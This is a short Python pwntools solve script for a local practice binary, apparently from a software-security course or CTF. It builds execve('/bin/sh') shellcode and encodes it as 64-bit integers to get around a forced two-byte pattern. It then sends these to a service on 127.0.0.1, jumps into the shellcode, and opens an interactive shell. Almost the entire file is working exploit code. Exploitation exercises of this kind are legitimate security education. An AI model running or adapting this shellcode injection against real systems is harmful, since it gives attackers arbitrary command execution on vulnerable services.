#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-5')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

port = 1024
conn = pwn.remote('127.0.0.1', port)

# i need to write shellcode
# byte 1-8 of my choice
# byte 9  = 0x48
# byte 10 = 0xb8
shellcode = pwn.asm('''
    lea rdi, [rip + sh];
    push 0x7777b848
    
    nop;
    nop;
    nop;
    nop;
    jmp $+4;
    .byte 0x48, 0xb8;
                    
    mov rax, 59;
    push 0x7777b848
    
    syscall;
    nop;
    nop;
    jmp $+4;
    .byte 0x48, 0xb8;
sh:
    .string "/bin/sh"
''')

# we need 5 numbers

conn.sendlineafter(b'How many numbers do you need? ', b'5')

for i in range(0, len(shellcode), 10):
    print(f'{shellcode[i:i+8].hex()} | {shellcode[i+8:i+10].hex()}')
    conn.sendlineafter(b': ', str(pwn.u64(shellcode[i:i+8])).encode())

conn.sendlineafter(b'Enter an offset to jump to: ', b'2')

# enjoy your shell
conn.interactive()